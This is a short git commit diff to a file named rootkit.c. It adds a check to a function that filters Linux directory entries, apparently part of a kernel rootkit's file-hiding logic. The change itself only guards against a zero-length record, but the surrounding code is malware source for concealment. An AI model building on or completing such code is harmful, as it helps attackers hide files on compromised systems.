5c57ac53290527943cc6af0e3d0f52ddd49698c2
Moses Miller <Majora320@gmail.com>
2018-05-26 23:00:20 -0700

    Temp

--- rootkit.c
+++ rootkit.c
@@ -65,6 +65,11 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 		d = *(dirp+index);
 		reclen = d.d_reclen;
 		
+		if (reclen == 0) {
+			pr_info("ROOTKIT reclen was 0 (CRITICAL ERROR THIS SHOULD NEVER HAPPEN)");
+			break;
+		}
+		
 		/*if (!pred(d)) {
 			length -= reclen;
 			
